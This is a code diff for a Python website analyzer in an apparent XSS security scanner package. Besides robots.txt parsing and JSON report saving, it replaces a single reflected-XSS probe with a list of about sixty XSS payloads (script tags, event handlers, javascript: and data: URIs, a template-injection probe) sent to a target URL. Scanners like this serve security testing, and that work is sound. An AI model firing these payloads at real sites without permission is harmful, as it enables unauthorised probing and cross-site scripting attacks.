@@ -4,8 +4,9 @@ import requests
 import re
 import json
 import os
+from pathlib import Path
 from bs4 import BeautifulSoup
-from urllib.parse import urljoin
+from urllib.parse import quote, urljoin, urlparse
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 from requests.exceptions import RequestException, Timeout
@@ -13,6 +14,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # Универсальные пути пакета
 from xss_security_gui import DIRS
+from xss_security_gui.utils.collections import dedupe_preserve_order
 
 # Путь для сохранения deep_crawl.json
 CRAWL_OUTPUT = os.path.join(DIRS["logs"], "deep_crawl.json")
@@ -33,6 +35,7 @@ JS_FETCH_TIMEOUT = 3
 PAGE_FETCH_TIMEOUT = 5
 SOURCEMAP_TIMEOUT = 2
 CONCURRENT_JS_FETCH = 6
+SITE_ANALYSIS_DIR = Path(DIRS["logs"]).parent / "cache" / "site_analysis"
 
 # Precompiled patterns
 EMBEDDED_JSON_TEMPLATE = r'{key}\s*=\s*(\{{.*?\}}|\[.*?\])\s*;?'
@@ -63,20 +66,6 @@ def fetch_text_limited(url, timeout=JS_FETCH_TIMEOUT, max_bytes=MAX_JS_BYTES):
         return "".join(content_chunks)
     except (RequestException, Timeout):
         return ""
-
-
-def dedupe_preserve_order(seq):
-    seen = set()
-    out = []
-    for item in seq:
-        try:
-            key = item if isinstance(item, (str, int, float, tuple)) else json.dumps(item, sort_keys=True, ensure_ascii=False)
-        except Exception:
-            key = str(item)
-        if key not in seen:
-            seen.add(key)
-            out.append(item)
-    return out
 
 
 def extract_embedded_json(soup, keys):
@@ -163,6 +152,9 @@ def analyze_deep(url):
         "graphql": [],
         "content_score": 0,
         "robots_txt": [],
+        "robots_raw": "",
+        "robots_disallow": [],
+        "robots_status": None,
         "headers": {},
         "cookies": [],
         "debug_flags": [],
@@ -180,6 +172,7 @@ def analyze_deep(url):
         content_type = r.headers.get("Content-Type", "")
         if "text/html" not in content_type and "application/xhtml+xml" not in content_type:
             result["error"] = f"Unsupported Content-Type: {content_type}"
+            _save_site_analysis(url, result)
             return result
 
         html = r.text
@@ -254,13 +247,83 @@ def analyze_deep(url):
             result["forms"].append({"action": action, "method": method, "inputs": inputs})
 
         # Reflected XSS
-        test_payload = "<script>alert(1)</script>"
-        try:
-            test = session.get(url, params={"xss": test_payload}, timeout=3)
-            if test_payload in test.text:
-                result["xss_reflected"] = True
-        except Exception:
-            pass
+        payloads = [
+            "<xss onbeforeprint=console.log(1)></xss>",
+            "\"><svg/onload=alert(1)>",
+            "<img src=x onerror=alert(1)>",
+            "{{7*7}}",
+            "<script>alert(1)</script>",
+            "<iframe src='javascript:alert(1)'></iframe>",
+            "<body onload=alert(1)>",
+            "<input autofocus onfocus=alert(1)>",
+            "<video><source onerror=alert(1)>",
+            "<math><maction xlink:href='javascript:alert(1)'></maction></math>",
+            "<object data='javascript:alert(1)'></object>",
+            "<embed src='javascript:alert(1)'>",
+            "<link rel='stylesheet' href='javascript:alert(1)'>",
+            "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
+            "<form action='javascript:alert(1)'><input type='submit'></form>",
+            "<a href='javascript:alert(1)'>Click me</a>",
+            "<button onclick='alert(1)'>Click</button>",
+            "<select onchange='alert(1)'><option>1</option></select>",
+            "<textarea onfocus='alert(1)'></textarea>",
+            "<div onmouseover='alert(1)'>Hover me</div>",
+            "<span onmouseout='alert(1)'>Move out</span>",
+            "<p onmousedown='alert(1)'>Mouse down</p>",
+            "<h1 onmouseup='alert(1)'>Mouse up</h1>",
+            "<li onmouseenter='alert(1)'>Enter</li>",
+            "<ol onmouseleave='alert(1)'>Leave</ol>",
+            "<ul onmousemove='alert(1)'>Move</ul>",
+            "<table oncontextmenu='alert(1)'>Right click</table>",
+            "<tr onselectstart='alert(1)'>Select</tr>",
+            "<td ondragstart='alert(1)'>Drag</td>",
+            "<th ondrop='alert(1)'>Drop</th>",
+            "<caption onscroll='alert(1)'>Scroll</caption>",
+            "<colgroup onresize='alert(1)'>Resize</colgroup>",
+            "<col oncopy='alert(1)'>Copy</col>",
+            "<thead oncut='alert(1)'>Cut</thead>",
+            "<tbody onpaste='alert(1)'>Paste</tbody>",
+            "<tfoot onselect='alert(1)'>Select</tfoot>",
+            "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
+            "<object type='text/html' data='data:text/html,<script>alert(1)</script>'></object>",
+            "<embed type='text/html' src='data:text/html,<script>alert(1)</script>'></embed>",
+            "<applet code='alert(1)'></applet>",
+            "<marquee onstart='alert(1)'>Marquee</marquee>",
+            "<bgsound src='javascript:alert(1)'>",
+            "<base href='javascript:alert(1)'>",
+            "<meta name='viewport' content='width=device-width, initial-scale=1, user-scalable=no, onload=alert(1)'>",
+            "<style>@import 'javascript:alert(1)';</style>",
+            "<link rel='import' href='javascript:alert(1)'>",
+            "<script type='module'>import('data:text/javascript,alert(1)');</script>",
+            "<script nomodule src='data:text/javascript,alert(1)'></script>",
+            "<script type='text/javascript'>alert(1)</script>",
+            "<object data=""data:text/html,<script>alert(1)</script>""></object>",
+            "<embed src=""data:text/html,<script>alert(1)</script>""></embed>",
+            "<applet code=""alert(1)""></applet>",
+            "<marquee onstart=""alert(1)"">Marquee</marquee>",
+            "<bgsound src=""javascript:alert(1)"">",
+            "<base href=""javascript:alert(1)"">",
+            "<meta name=""viewport"" content=""width=device-width, initial-scale=1, user-scalable=no, onload=alert(1)"">",
+            "<style>@import ""javascript:alert(1)"";</style>",
+            "<link rel=""import"" href=""javascript:alert(1)"">",
+            "<script type=""module"">import(""data:text/javascript,alert(1)"");</script>",
+            "<script nomodule src=""data:text/javascript,alert(1)""></script>",
+        ]
+
+        for payload in payloads:
+            try:
+                test = session.get(
+                    url,
+                    params={"xss": payload},
+                    timeout=3
+                )
+
+                if payload in test.text:
+                    result["xss_reflected"] = True
+                    break
+
+            except Exception:
+                pass
 
         # Inline JS
         for script in soup.find_all("script"):
@@ -303,14 +366,54 @@ def analyze_deep(url):
         try:
             rb = session.get(urljoin(url, "/robots.txt"), timeout=3)
             if rb.status_code == 200:
-                result["robots_txt"] = [line.strip() for line in rb.text.splitlines() if line.lower().startswith("disallow")]
+                robots_raw = rb.text
+
+                result["robots_raw"] = robots_raw
+
+                result["robots_txt"] = [
+                    line.strip()
+                    for line in robots_raw.splitlines()
+                    if line.strip()
+                ]
+
+                result["robots_disallow"] = [
+                    line.strip()
+                    for line in robots_raw.splitlines()
+                    if line.lower().startswith("disallow")
+                ]
+
+                result["robots_status"] = rb.status_code
+
+            else:
+                result["robots_raw"] = ""
+                result["robots_txt"] = []
+                result["robots_disallow"] = []
+                result["robots_status"] = rb.status_code
         except Exception:
+            result["robots_raw"] = ""
             result["robots_txt"] = []
+            result["robots_disallow"] = []
+            result["robots_status"] = None
 
     except Exception as e:
         result["error"] = str(e)
 
+    _save_site_analysis(url, result)
     return result
+
+
+def _save_site_analysis(url, result):
+    """Persist a single site's deep-analysis result as a JSON report."""
+    report_name = quote(urlparse(url).netloc, safe=".-_") or "unknown-site"
+    report_file = SITE_ANALYSIS_DIR / f"{report_name}.json"
+    try:
+        SITE_ANALYSIS_DIR.mkdir(parents=True, exist_ok=True)
+        report_file.write_text(
+            json.dumps(result, indent=2, ensure_ascii=False),
+            encoding="utf-8",
+        )
+    except (OSError, TypeError, ValueError) as exc:
+        print(f"⚠️ Не удалось сохранить JSON-анализ {report_file}: {exc}")
 
 
 def analyze_list(urls, export_path=None):
@@ -345,3 +448,5 @@ def analyze_list(urls, export_path=None):
         print(f"✅ {export_path} сохранён.")
     except Exception as e:
         print(f"❌ Ошибка сохранения {export_path}: {e}")
+
+    return all_results
